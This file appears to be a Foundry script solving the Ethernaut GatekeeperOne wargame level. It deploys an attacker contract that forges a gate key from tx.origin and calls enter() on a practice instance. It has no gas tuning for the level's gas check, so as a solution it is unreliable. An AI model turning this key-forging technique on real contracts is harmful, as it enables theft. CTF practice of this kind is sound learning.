//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "lib/forge-std/src/Script.sol";
import {GatekeeperOne}  from "src/ethernaut13.sol";
import {console} from "lib/forge-std/src/console.sol";

contract ethernaut13Script is Script{
    GatekeeperOne instance = GatekeeperOne(0x5f50b8fe0dEdf501553226A73A4E418b93aBf82e);

    function run() public{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        attacker attacke = new attacker{value: 1 ether}();

        attacke.attack(instance);
    
        vm.stopBroadcast();
    }
}
contract attacker{

    constructor() payable{
    }

    function attack(GatekeeperOne instance) public{
        uint64 key = (uint64(1) << 32) | uint64(uint16(uint160(tx.origin)));
        bytes8 gateKey = bytes8(key);

        instance.enter(gateKey);
    }
}

